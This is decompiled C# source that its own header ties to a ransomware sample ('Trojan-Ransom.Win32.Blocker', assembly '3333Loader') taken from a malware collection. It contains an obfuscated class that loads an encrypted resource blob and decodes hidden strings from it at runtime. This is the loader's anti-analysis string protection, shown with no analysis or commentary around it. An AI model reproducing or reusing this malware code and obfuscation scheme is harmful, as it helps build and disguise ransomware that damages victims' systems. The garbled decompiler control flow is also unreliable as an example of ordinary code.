// Decompiled with JetBrains decompiler
// Type: .
// Assembly: 3333Loader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=3e680bb8e8f7146a
// MVID: AC26F425-825E-43FA-8516-468D20875E0E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.arle-3514426249a681892efc46c3112f1c90d9ccb52bdebaf10538a8f8ba1099bfb0.exe

using \u0001;
using \u0003;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u0001
{
  internal sealed class \u0006
  {
    private static string \u0001 = "1";
    private static string \u0002 = "108";
    private static byte[] \u0001 = (byte[]) null;
    private static Hashtable \u0001 = (Hashtable) null;
    private static bool \u0001 = false;
    private static int \u0001 = 0;

    [\u0007]
    [\u0002.\u0002]
    public static string \u0001([In] int obj0)
    {
      int num1 = obj0;
      int num2;
      int num3;
      string str1;
      int num4;
      while (true)
      {
        int num5 = \u0006.\u0001;
        int num6 = num1 - num5;
        if (true)
          goto label_19;
label_2:
        if (\u0006.\u0001)
        {
          str1 = (string) \u0013.\u007E\u0016((object) \u0006.\u0001, (object) obj0);
          switch (str1)
          {
            case null:
              break;
            default:
              goto label_20;
          }
        }
        int num7 = 0;
        if (num7 == 0)
          goto label_21;
label_9:
        if ((num7 & 64) != 0)
        {
          int num8 = (num3 & 31) << 24;
          byte[] numArray1 = \u0006.\u0001;
          int index1 = num2;
          int num9 = index1 + 1;
          int num10 = (int) numArray1[index1] << 16;
          int num11 = num8 + num10;
          byte[] numArray2 = \u0006.\u0001;
          int index2 = num9;
          int num12 = index2 + 1;
          int num13 = (int) numArray2[index2] << 8;
          int num14 = num11 + num13;
          byte[] numArray3 = \u0006.\u0001;
          int index3 = num12;
          num2 = index3 + 1;
          int num15 = (int) numArray3[index3];
          num4 = num14 + num15;
          if (false)
          {
            num1 = num4;
            continue;
          }
          goto label_12;
        }
        else
          goto label_10;
label_21:
        num2 = obj0;
        if (true)
        {
          num3 = (int) \u0006.\u0001[num2++];
          if ((num3 & 128) == 0)
            break;
        }
        num7 = num3;
        goto label_9;
label_19:
        obj0 = num6;
        goto label_2;
      }
      int num16 = num3;
      if (num16 == 0)
        return string.Empty;
      goto label_13;
label_10:
      num16 = ((num3 & 63) << 8) + (int) \u0006.\u0001[num2++];
      goto label_13;
label_12:
      num16 = num4;
label_13:
      try
      {
        byte[] numArray = \u0015.\u0018(\u0014.\u007E\u0017((object) \u000F.\u0011(), \u0006.\u0001, num2, num16));
        string str2 = \u0016.\u0019(\u0014.\u007E\u0017((object) \u000F.\u0011(), numArray, 0, numArray.Length));
        if (\u0006.\u0001)
        {
          try
          {
            \u0017.\u007E\u001A((object) \u0006.\u0001, (object) obj0, (object) str2);
          }
          catch
          {
          }
        }
        return str2;
      }
      catch
      {
        return (string) null;
      }
label_20:
      return str1;
    }

    static \u0006()
    {
      if (\u0018.\u001B(\u0006.\u0001, "1"))
      {
        \u0006.\u0001 = true;
        \u0006.\u0001 = new Hashtable();
      }
      \u0006.\u0001 = \u0019.\u001C(\u0006.\u0002);
      Assembly assembly = \u0004.\u0004();
      Stream stream = \u0005.\u007E\u0005((object) assembly, "{5aba1c47-adad-4e9d-b951-f158a40881c7}");
      try
      {
        int length = \u001B.\u001E(\u001A.\u007E\u001D((object) stream));
        do
        {
          byte[] numArray = new byte[length];
          int num = \u001C.\u007E\u001F((object) stream, numArray, 0, length);
          \u0006.\u0001 = \u0005.\u0001(numArray);
          \u000E.\u007E\u000F((object) stream);
        }
        while (false);
      }
      finally
      {
        if (stream != null)
          \u000E.\u007E\u000E((object) stream);
      }
    }
  }
}
